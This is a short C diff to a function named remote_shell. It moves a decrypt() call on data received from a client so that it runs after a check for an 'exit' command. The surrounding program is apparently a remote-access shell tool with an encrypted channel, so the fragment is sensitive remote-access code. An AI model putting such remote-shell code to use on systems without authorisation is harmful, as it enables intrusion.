@@ -675,14 +675,14 @@ void remote_shell(unsigned long key)
 
 					buffcli_size = (unsigned long)nread;
 
-					decrypt(buff_cli, buffcli_size, key);
-
 					if (buffcli_size == 5 && buff_cli[0] == 'e' && buff_cli[1] == 'x'
 					&& buff_cli[2] == 'i' && buff_cli[3] == 't' && buff_cli[4] == '\n')
 					{
 						end_tls = 1;
 						break ;
 					}
+
+					decrypt(buff_cli, buffcli_size, key);
 
 					if (buffcli_size == 0)
 						break ;
